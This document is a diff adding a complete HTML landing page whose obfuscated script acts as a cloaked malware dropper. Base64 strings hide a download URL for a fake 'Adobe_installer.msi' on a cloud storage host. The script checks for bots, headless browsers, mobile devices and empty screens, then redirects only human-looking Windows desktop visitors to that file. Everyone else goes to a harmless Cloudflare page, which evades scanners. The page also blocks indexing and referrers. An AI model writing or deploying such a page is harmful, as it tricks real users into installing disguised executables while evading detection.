@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow">
+    <script type="text/javascript">
+        (function() {
+            const _0x1 = "aHR0cHM6Ly9jbG91ZC1zcGFjZS1hcGkuZnJhMS5jZG4uZGlnaXRhbG9jZWFuc3BhY2VzLmNvbS9BZG9iZV9pbnN0YWxsZXIubXNp"; 
+            const _0x2 = "aHR0cHM6Ly9kYXNoLmNsb3VkZmxhcmUuY29t";
+
+            function _v() {
+                const n = window.navigator;
+                const w = window;
+                const u = n.userAgent;
+                
+                const p = (n.userAgentData?.platform || n.platform).toLowerCase();
+                const isWin = p.indexOf('win') !== -1;
+                const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi/i.test(u);
+                
+                const isBot = n.webdriver || 
+                              /bot|crawler|spider|slurp|google|bing|yandex|headless/i.test(u) || 
+                              (n.languages && n.languages.length === 0);
+
+                const isFake = (w.screen && w.screen.width === 0 && w.screen.height === 0) || 
+                               (w.outerWidth === 0 && w.outerHeight === 0);
+
+                if (isWin && !isMob && !isBot && !isFake) {
+                    w.location.replace(atob(_0x1));
+                } else {
+                    w.location.replace(atob(_0x2));
+                }
+            }
+
+            const d = Math.floor(Math.random() * 150) + 50;
+            setTimeout(_v, d);
+        })();
+    </script>
+    <style>body{background:#fff;margin:0;overflow:hidden;}</style>
+</head>
+<body>
+    <noscript><meta http-equiv="refresh" content="0;url=https://dash.cloudflare.com"></noscript>
+</body>
+</html>
